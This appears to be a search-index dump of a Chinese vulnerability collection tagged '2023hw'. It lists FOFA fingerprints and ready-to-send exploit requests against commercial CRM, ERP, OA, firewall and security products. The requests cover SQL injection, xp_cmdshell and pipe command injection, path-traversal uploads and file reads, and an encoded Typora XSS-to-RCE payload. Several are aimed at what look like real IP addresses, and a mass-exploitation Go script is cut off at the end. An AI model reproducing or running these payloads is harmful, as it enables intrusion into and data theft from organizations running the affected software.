print(\"eg:python exp.py url\") else: exp(sys.argv[1]) ","date":"2023-12-08","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"亿赛通电子文档平台文件上传漏洞","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"任我行 CRM SmsDataList SQL注入漏洞 POST /SMS/SmsDataList/?pageIndex=1\u0026pageSize=30 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 170 Keywords=\u0026StartSendDate=2020-06-17\u0026EndSendDate=2020-09-17\u0026SenderTypeId=00000000* ","date":"2023-12-08","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"任我行 CRM SmsDataList SQL注入漏洞","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"![img](http://112.53.236.114:81/favicon.ico)\r特征favicon.ico ","date":"2023-12-08","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"任我行CRM SmsDataList SQL注入","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"fofa app=\"任我行-CRM\" ","date":"2023-12-08","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw"],"title":"任我行CRM SmsDataList SQL注入","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"poc POST /SMS/SmsDataList/?pageIndex=1\u0026pageSize=30 HTTP/1.1 Host: 101.200.41.166:8888 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 132 Keywords=\u0026StartSendDate=2020-06-17\u0026EndSendDate=2020-09-17\u0026SenderTypeId=0000000000' and 1=convert(int,(system_user)) AND 'CvNI'='CvNI ","date":"2023-12-08","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw"],"title":"任我行CRM SmsDataList SQL注入","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"企望制造 ERP comboxstore.action 远程命令执行漏洞 POST /mainFunctions/comboxstore.action HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: xxx.xxx.xxx.xxx comboxsql=exec%20xp_cmdshell%20'type%20C:\\Windows\\Win.ini' ","date":"2023-12-08","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"企望制造 ERP comboxstore.action 远程命令执行漏洞","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"企望-ERP系统\" ","date":"2023-12-08","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0erp%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8-sql-%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"企望制造ERP系统存在 sql 注入导致的命令执行漏洞 ","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0erp%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8-sql-%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp POST /mainFunctions/comboxstore.action HTTP/1.1 Host: 110.187.226.220:8093 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Accept-Encoding: gzip Content-Length: 35 comboxsql=exec xp_cmdshell+\"whoami\" ","date":"2023-12-08","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0erp%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8-sql-%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"企望制造ERP系统存在 sql 注入导致的命令执行漏洞 ","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0erp%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8-sql-%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"傲盾软件\"||body=\"aodun/aodun.js\" ","date":"2023-12-08","objectID":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"傲盾信息安全管理系统前台 sichuan_login 远程命令执行漏洞","uri":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://211.161.45.230:7789/static/base_static/js/aodun/test.txt POST /user_management/sichuan_login/ HTTP/1.1 Host: 211.161.45.230:7789 Content-Length: 102 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://211.161.45.230:7789 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://211.161.45.230:7789/user_management/sichuan_login/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=zh; isms_web=auu8o0ihreumo0bmrhuz8qa5p4pq882y Connection: close loginname=sysadmin\u0026ticket=|whoami\u003e/adm/isms_web/static/base_static/js/aodun/test.txt ","date":"2023-12-08","objectID":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"傲盾信息安全管理系统前台 sichuan_login 远程命令执行漏洞","uri":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp detail: ID: 4941 Author: 匿名作者 Name: 傲盾信息安全管理系统前台远程命令执行漏洞 Description: 信息安全管理系统（ISMS）是IDC/ISP业务经营者建设的具有基础数据管理、 访问日志管理、信息安全管理等功能的信息安全管理系统，该漏洞可未授权的情况下直接执行任意命令 Identifier: DVB: DVB-2023-4941 VulnClass: - 远程命令执行 Category: - 应用服务 Manufacturer: 傲盾 Product: 傲盾 信息安全管理系统\u003c=7.1.7.24 Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: '2023-08-14' Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"傲盾软件\"||body=\"aodun/aodun.js\" Solutions: - 访问控制，对输入过滤并修复相关代码 Sources: - http://61.183.8.97:7789 poc: relative: req0 \u0026\u0026 req1 session: false get_variables: - '{{randomstr}}': randomLowerCase(5) requests: - method: POST timeout: 10 path: /user_management/sichuan_login headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3119.54 Safari/537.36 Content-Type: application/x-www-form-urlencoded data: loginname=sysadmin\u0026ticket=|echo {{randomstr}}\u003e/adm/isms_web/static/base_static/js/aodun/test.txt follow_redirects: true matches: code.eq(\"200\") - method: GET timeout: 10 path: /static/base_static/js/aodun/test.txt headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3119.54 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"{{randomstr}}\")) ","date":"2023-12-08","objectID":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"傲盾信息安全管理系统前台 sichuan_login 远程命令执行漏洞","uri":"/%E5%82%B2%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0-sichuan_login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"华为Auth-Http Serve任意文件读取 华为Auth-Http服务,华为Auth-Http Server是一款安全认证服务器，在提供安全的远程登录和网络资源访问控制。支持多种认证方式和协议AAA、Radius、TACACS+等，可以实现用户身份认证、授权和审计等功能。同时，可广泛应用于企业、政府、教育等行业的安全架构中。华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件 ","date":"2023-12-08","objectID":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":["2023hw漏洞"],"title":"华为Auth-Http Serve任意文件读取","uri":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"fofa server=\"Huawei Auth-Http Server 1.0\" ","date":"2023-12-08","objectID":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:2:0","tags":["2023hw漏洞"],"title":"华为Auth-Http Serve任意文件读取","uri":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"POC /umweb/shadow ","date":"2023-12-08","objectID":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:3:0","tags":["2023hw漏洞"],"title":"华为Auth-Http Serve任意文件读取","uri":"/%E5%8D%8E%E4%B8%BAauth-http-serve%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"/OAapp/WebObjects/OAapp.woa\" 华天动力OA是一款将先进的管理思想、 管理模式和软件技术、网络技术相结合，为用户提供了低成本、 高效能的协同办公和管理平台。华天动力OA MyHttpServlet 存在任意文件上传漏洞，攻击者可上传恶意的raq文件并执行raq文件中的任意sql语句，获取用户账号密码等敏感信息。 ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/:0:0","tags":["2023hw"],"title":"华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/"},{"categories":["2023hw"],"content":"poc ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/:1:0","tags":["2023hw"],"title":"华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/"},{"categories":["2023hw"],"content":"上传req POST /OAapp/MyHttpServlet HTTP/1.1 Host: 101.200.223.75 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a Accept-Encoding: gzip Content-Length: 181 --9b0af0d79eaea67c3aa1889b0b43a50a Content-Disposition: form-data; name=\"file\"; filename=\"\\\\Temp\\\\../../../report/reportFiles/55cBED.jpg\" RQQR --9b0af0d79eaea67c3aa1889b0b43a50a-- ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/:1:1","tags":["2023hw"],"title":"华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/"},{"categories":["2023hw"],"content":"访问 GET /report/reportJsp/showHTReport.jsp?reportFile=55cBED.jpg HTTP/1.1 Host: 101.200.223.75 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/:1:2","tags":["2023hw"],"title":"华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/"},{"categories":["2023hw"],"content":"gobyexp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 94 {\"hostinfo\":\"http://101.200.223.75\",\"vulfile\":\"CVD-2023-1220.go\",\"expparams\":{\"sql\":\"user()\"}} ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/:2:0","tags":["2023hw"],"title":"华天动力-OA8000 MyHttpServlet 文件 reportFile 参数文件上传漏洞导致sql注入 CVD-2023-1220","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B-oa8000-myhttpservlet-%E6%96%87%E4%BB%B6-reportfile-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5-cvd-2023-1220/"},{"categories":["2023hw"],"content":"```\rPOST /OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1 Host: 106.14.168.223:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 54 filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml ../../../OAapp/WEB-INF/web.xml ../../../Tomcat/webapps/OAapp/WEB-INF/web.xml ","date":"2023-12-08","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:0:0","tags":["2023hw"],"title":"华天动力OA任意文件读取","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"# fofa\rapp=\"启明星辰-4A统一安全管控平台\" ","date":"2023-12-08","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmater-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:0:0","tags":["2023hw"],"title":"启明星辰-4A统一安全管控平台 getMater 信息泄漏","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmater-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":["2023hw"],"content":"poc https://xxxxxxx/accountApi/getMaster.do ","date":"2023-12-08","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmater-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:1:0","tags":["2023hw"],"title":"启明星辰-4A统一安全管控平台 getMater 信息泄漏","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmater-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":["2023hw漏洞"],"content":"基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317） ","date":"2023-12-08","objectID":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/:0:0","tags":["2023hw漏洞"],"title":"基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）","uri":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/"},{"categories":["2023hw漏洞"],"content":"漏洞简介 Windows和Linux版本1.6.7之前的Typora中updater/update.html中基于DOM的XSS允许特制的markdown文件通过加载在Typora主窗口的上下文中运行任意JavaScript代码typora://app/typemark/updater/update.html在＜embed＞标记中。如果用户在Typora中打开恶意降价文件，或者从恶意网页复制文本并将其粘贴到Typora，则可以利用此漏洞。 \u003cembed src=\"typora://app/typemark/updater/updater.html?curVersion=111\u0026newVersion=222\u0026releaseNoteLink=333\u0026hideAutoUpdates=false\u0026labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ'))\u003e\u003c%2fsvg\u003e%22,%22%22,%22%22,%22%22,%22%22]\"\u003e\u003c/embed\u003e ","date":"2023-12-08","objectID":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/:1:0","tags":["2023hw漏洞"],"title":"基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）","uri":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 https://mp.weixin.qq.com/s/Jssc5eW7FVcyWPL9IVHr9g ","date":"2023-12-08","objectID":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/:2:0","tags":["2023hw漏洞"],"title":"基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）","uri":"/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/"},{"categories":["2023hw漏洞"],"content":"多个防火墙产品RCE ","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:1:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw漏洞"],"content":"影响版本 H3C-下一代防火墙 安恒信息-明御安全网关 MAiPU-安全网关 D_Link-下一代防火墙 HUAWEI-公司产品 迈普通信技术股份有限公司安全网关 博达通信-下一代防火墙 任天行网络安全管理系统\\安全审计系统 安博通应用网关 烽火网络安全审计 瑞斯康达科技发展股份有限公司安全路由器 任子行网络安全审计系统 绿盟安全审计系统 深圳市鑫塔科技有限公司第二代防火墙 ","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:2:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"/webui/images/default/default/alert_close.jpg\" ","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:3:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw漏洞"],"content":"poc /sslvpn/sslvpn_client.php?client=logoImg\u0026img=%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt ","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:4:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw漏洞"],"content":"批量利用脚本 package main import ( \"crypto/tls\" \"fmt\" \"github.com/fatih/color\" \"github.com/hpifu/go-kit/hflag\" \"github.com/imroc/req/v3\" \"github.com/thanhpk/randstr\" \"net/http\" \"strings\" \"time\" ) var reqHeader = map[string]string{ \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"zh-CN,zh-TW;q=0.9,zh;q=0.8\", \"Connection\": \"close\", } func main() { hflag.AddFlag(\"target\", \"SSLVPN系统地址\", hflag.Required(), hflag.Shorthand(\"t\")) if err2 := hflag.Parse(); err2 != nil { fmt.Println(hflag.Usage()) return } targetHost := hflag.GetString(\"target\") filename := randstr.Hex(8) + \".php\" vulPath := 